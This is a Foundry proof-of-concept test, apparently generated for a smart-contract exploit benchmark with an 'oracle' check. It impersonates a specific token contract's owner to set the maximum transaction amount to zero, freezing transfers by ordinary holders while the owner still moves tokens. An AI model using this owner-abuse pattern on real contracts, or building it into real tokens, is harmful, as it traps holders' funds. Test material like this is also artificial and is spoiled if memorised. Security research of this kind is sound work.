// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IWEB3 {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd0c4BC1B89BbD105EeCb7EBa3f13E7648c0De38F;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET address
        // and impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the current owner of the contract
        IWEB3 target = IWEB3(TARGET);
        address owner = target.owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(attacker, "Attacker");

        // Step 2: Impersonate the owner and set maxTxPercent to 0
        vm.startPrank(owner);
        target.setMaxTxPercent(0);
        vm.stopPrank();

        // Step 3: Verify _maxTxAmount is now 0
        uint256 maxTxAmount = target._maxTxAmount();
        require(maxTxAmount == 0, "maxTxAmount should be 0");

        // Step 4: Create a test user and give them some tokens
        address testUser = address(0x123);
        vm.label(testUser, "Test User");

        // First, get some tokens from owner to testUser
        vm.startPrank(owner);
        target.transfer(testUser, 1000 * 10**9); // Transfer some tokens (accounting for 9 decimals)
        vm.stopPrank();

        // Step 5: Try to transfer from testUser (should fail)
        vm.startPrank(testUser);

        // This should revert because testUser is not owner and amount > _maxTxAmount (0)
        bool success = false;
        try target.transfer(address(0x456), 1 * 10**9) {
            success = true;
        } catch {
            success = false;
        }
        vm.stopPrank();

        // Verify the transfer failed
        require(!success, "User transfer should have failed but didn't");

        // Step 6: Verify owner can still transfer (bypasses the check)
        vm.startPrank(owner);
        target.transfer(address(0x789), 100 * 10**9);
        vm.stopPrank();

        // Final verification for the oracle
        assertEq(maxTxAmount, 0, "maxTxAmount should be 0 after exploit");
        assertEq(target._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
